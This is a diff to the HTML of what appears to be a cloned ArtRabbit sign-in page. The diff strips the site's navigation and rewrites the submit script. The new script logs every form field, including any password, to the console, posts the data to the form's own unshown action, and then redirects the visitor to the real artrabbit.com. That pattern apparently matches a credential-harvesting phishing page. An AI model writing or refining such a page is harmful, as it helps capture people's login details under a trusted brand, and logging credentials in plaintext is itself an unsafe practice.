@@ -13,44 +13,6 @@
 </head>
 <body class="mod--form">
 
-<header>
-    <div class="Site-head js-getTimezone">
-        <div class="Header">
-            <div class="Header-logo">
-                <a href="/" class="Logo">Welcome to ArtRabbit</a>
-            </div>
-            <div class="Header-nav m_menu" id="ar_menu">
-                <ul class="m_menu-item m_menu-secondary" id="ar_menu-secondary">
-                    <li class="app-button-navitem">
-                        <div class="app-button">
-                            <div class="app-button-circle">
-                                <a href="/what-you-can-do/app" class="app-button rotated">Get<br>the app</a>
-                            </div>
-                        </div>
-                    </li>
-                    <li class="js-search-toggle">
-                        <a href="/search" class="m_menu-control" data-menutype="search"><span class="m_nav-control-icon mod--search">Toggle </span>Search</a>
-                    </li>
-                    <li>
-                        <a href="" class="m_menu-control m_nav-override" data-menutype="social">
-                            <span class="m_nav-control-icon mod--login">Toggle </span>Log in
-                        </a>
-                    </li>
-                </ul>
-                <ul class="m_menu-item m_menu-primary" role="nav" id="ar_menu-primary">
-                    <li><a class="m_menu-control mod--active" href="/home">Home</a></li>
-                    <li><a class="m_menu-control" href="/events">Events</a></li>
-                    <li><a class="m_menu-control" href="/online">Online Events</a></li>
-                    <li><a class="m_menu-control" href="/artworks">Artworks for sale</a></li>
-                    <li><a class="m_menu-control" href="/events#map">Art Map</a></li>
-                    <li><a class="m_menu-control" href="/network/features">Editorial Features</a></li>
-                    <li><a class="m_menu-control" href="/artist-opportunities">Open Calls</a></li>
-                </ul>
-            </div>
-        </div>
-    </div>
-</header>
-
 <div class="Site-body">
     <div class="Site-section">
         <main>
@@ -87,64 +49,37 @@
     </div>
 </div>
 
-<footer>
-    <div class="Site-foot">
-        <div class="m_footer mod--white">
-            <div class="l_frame">
-                <div class="m_report-bar">
-                    <div class="m_report-form"><a href="https://artrabbit.uservoice.com/" id="report-button" class="m_report-button mod--flag"><span>Give feedback, report a problem or request access to your information.</span></a></div>
-                </div>
-            </div>
-            <div class="m_footer-divider">
-                <div class="l_frame">
-                    <div class="l_row">
-                        <div class="g_grid-2 r_b2_grid-3">
-                            <div class="l_inner-grid r_b3_accordion">
-                                <h4 class="b_footer-heading r_b3_instruction-button">About <span class="b_chevron-icon">Toggle</span></h4>
-                                <ul class="h_list-reset r_b3_accordion-content">
-                                    <li class="l"><a href="/about/artrabbit">ArtRabbit</a></li>
-                                    <li class="l"><a href="/about/community-guidelines">Community Guidelines</a></li>
-                                    <li class="l"><a href="/about/places">Places</a></li>
-                                    <li class="l"><a href="/about/app">App</a></li>
-                                    <li class="l"><a href="/network/partners">Partners</a></li>
-                                    <li class="l"><a href="https://www.artrabbit.com/about/art-travel-companion">Art and Culture Travel Companion</a></li>
-                                </ul>
-                            </div>
-                        </div>
-                        <!-- Additional footer content can go here -->
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</footer>
-
 <script>
-   document.addEventListener('DOMContentLoaded', function() {
-    const form = document.querySelector('.form-signin');
-    
-    form.addEventListener('submit', async function(e) {
-        e.preventDefault(); // Prevent default form submission
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.querySelector('.form-signin');
         
-        const formData = new FormData(form);
-        
-        try {
-            const response = await fetch(form.action, {
-                method: 'POST',
-                body: formData,
-            });
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault(); // Prevent default form submission
             
-            const data = await response.json();
-            console.log(data); // Log the response data
+            const formData = new FormData(form);
             
-            if (data.status === "success") {
-                window.location.href = 'https://artrabbit.com'; // Redirect on success
+            // Log each key-value pair in the form data
+            for (const [key, value] of formData.entries()) {
+                console.log(key, value); // Log each key-value pair
             }
-        } catch (error) {
-            console.error('Error:', error);
-        }
+            
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                });
+                
+                const data = await response.json();
+                console.log(data); // Log the response data
+                
+                if (data.status === "success") {
+                    window.location.href = 'https://artrabbit.com'; // Redirect on success
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        });
     });
-});
 </script>
 
 </body>
